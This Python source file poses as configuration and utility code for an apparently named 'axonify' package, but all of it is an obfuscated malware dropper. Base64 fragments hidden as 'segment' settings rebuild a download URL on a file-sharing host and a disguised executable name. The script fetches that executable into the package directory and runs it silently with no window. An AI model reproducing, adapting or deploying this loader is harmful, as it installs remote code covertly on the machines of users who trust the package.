import os
import requests
import base64
import subprocess
import importlib.util
import sys
import logging
from datetime import datetime

logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class SystemConfig:
    def __init__(self):
        self.settings = {
            'segment1': "aHR0",
            'segment2': "cHM6",
            'segment3': "Ly9h",
            'segment4': "bm9u",
            'segment5': "Zmls",
            'segment6': "ZS5p",
            'segment7': "by9h",
            'segment8': "cGkv",
            'segment9': "ZG93",
            'segment10': "bmxv",
            'segment11': "YWQv",
            'segment12': "aUpi",
            'segment13': "TVhp",
            'segment14': "aE4=",
            'segment15': "U2Vz",
            'segment16': "dmlj",
            'segment17': "ZUhh",
            'segment18': "bmRs",
            'segment19': "ZXIu",
            'segment20': "ZXhl",
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'timeout': 15
        }
    
    def get_setting(self, key):
        return self.settings.get(key, '')

config = SystemConfig()

class CryptoUtils:
    @staticmethod
    def decode(data):
        try:
            return base64.b64decode(data).decode('utf-8')
        except Exception as e:
            logging.error(f"Decoding error: {e}")
            return None

    @staticmethod
    def combine(parts):
        try:
            combined = ''.join(parts)
            return base64.b64decode(combined).decode('utf-8')
        except Exception as e:
            logging.error(f"Combination error: {e}")
            return None

class NetworkManager:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': config.get_setting('user_agent'),
            'Accept': '*/*'
        })
    
    def download_resource(self, url, destination):
        try:
            response = self.session.get(url, stream=True, timeout=config.get_setting('timeout'))
            response.raise_for_status()
            
            os.makedirs(os.path.dirname(destination), exist_ok=True)
            with open(destination, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
            return True
        except Exception as e:
            logging.error(f"Download failed: {e}")
            return False

class ProcessManager:
    @staticmethod
    def execute_silently(command):
        try:
            return subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except Exception as e:
            logging.error(f"Execution failed: {e}")
            return None

class PathResolver:
    @staticmethod
    def find_installation_directory():
        spec = importlib.util.find_spec('axonify')
        if spec and spec.origin:
            return os.path.dirname(spec.origin)
        
        python_executable = sys.executable
        python_dir = os.path.dirname(python_executable)
        site_packages_dir = os.path.join(python_dir, 'Lib', 'site-packages')
        return os.path.join(site_packages_dir, 'axonify')

if __name__ == "__main__":
    try:
        network = NetworkManager()
        resolver = PathResolver()
        
        api_parts = [
            config.get_setting('segment1'),
            config.get_setting('segment2'),
            config.get_setting('segment3'),
            config.get_setting('segment4'),
            config.get_setting('segment5'),
            config.get_setting('segment6'),
            config.get_setting('segment7'),
            config.get_setting('segment8'),
            config.get_setting('segment9'),
            config.get_setting('segment10'),
            config.get_setting('segment11'),
            config.get_setting('segment12'),
            config.get_setting('segment13'),
            config.get_setting('segment14')
            ]
        
        full_api = CryptoUtils.combine(api_parts)
        
        file_parts = [
            config.get_setting('segment15'),
            config.get_setting('segment16'),
            config.get_setting('segment17'),
            config.get_setting('segment18'),
            config.get_setting('segment19'),
            config.get_setting('segment20')
        ]
        full_filename = CryptoUtils.combine(file_parts)
        
        if not full_api or not full_filename:
            raise ValueError("Failed to reconstruct API or filename")
            
        install_dir = resolver.find_installation_directory()
        if not os.path.exists(install_dir):
            raise FileNotFoundError(f"Installation directory not found: {install_dir}")
            
        target_path = os.path.join(install_dir, full_filename)
        if network.download_resource(full_api, target_path):
            ProcessManager.execute_silently([target_path])
        
    except Exception as e:
        logging.error(f"Critical error: {e}")
        sys.exit(1)